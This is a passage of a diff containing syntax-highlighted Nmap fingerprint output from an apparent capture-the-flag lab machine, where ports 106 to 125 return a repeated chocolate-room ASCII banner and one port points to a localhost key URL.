+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">106/tcp open  pop3pw?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">107/tcp open  rtelnet?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">108/tcp open  snagas?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">109/tcp open  pop2?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">110/tcp open  pop3?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">111/tcp open  rpcbind?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   NULL, RPCCheck: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">112/tcp open  mcidas?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">113/tcp open  ident?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
+</span></span></span><span class="line"><span class="cl"><span class="s1">114/tcp open  audionews?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">115/tcp open  sftp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">116/tcp open  ansanotify?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">117/tcp open  uucp-path?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">118/tcp open  sqlserv?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">119/tcp open  nntp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">120/tcp open  cfdptkt?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GetRequest, HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">121/tcp open  erpc?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">122/tcp open  smakynet?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">123/tcp open  ntp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">124/tcp open  ansatrader?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">125/tcp open  locus-map?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
